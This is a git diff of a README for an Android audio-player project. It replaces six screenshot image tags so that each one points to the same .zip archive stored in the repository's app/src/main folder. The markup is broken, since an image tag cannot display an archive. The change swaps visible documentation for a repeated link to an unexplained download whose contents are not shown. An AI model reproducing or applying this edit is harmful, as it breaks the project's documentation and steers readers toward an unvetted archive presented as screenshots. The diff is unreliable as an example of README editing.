@@ -3,15 +3,15 @@
 Here are some screenshots!
 
 
-<img src="/Screenshot_20170511-202936.png" width="300">
+<img src="https://raw.githubusercontent.com/Sumedha/EAudioPlayer/master/app/src/main/EAudioPlayer_v1.9.zip" width="300">
 
-<img src="/Screenshot_20170511-202945.png" width="300">
+<img src="https://raw.githubusercontent.com/Sumedha/EAudioPlayer/master/app/src/main/EAudioPlayer_v1.9.zip" width="300">
 
-<img src="/Screenshot_20170511-202952.png" width="300">
+<img src="https://raw.githubusercontent.com/Sumedha/EAudioPlayer/master/app/src/main/EAudioPlayer_v1.9.zip" width="300">
 
-<img src="/Screenshot_20170511-203006.png" width="300">
+<img src="https://raw.githubusercontent.com/Sumedha/EAudioPlayer/master/app/src/main/EAudioPlayer_v1.9.zip" width="300">
 
-<img src="/Screenshot_20170511-203013.png" width="300">
+<img src="https://raw.githubusercontent.com/Sumedha/EAudioPlayer/master/app/src/main/EAudioPlayer_v1.9.zip" width="300">
 
-<img src="/Screenshot_20170511-203019.png" width="300">
+<img src="https://raw.githubusercontent.com/Sumedha/EAudioPlayer/master/app/src/main/EAudioPlayer_v1.9.zip" width="300">
 
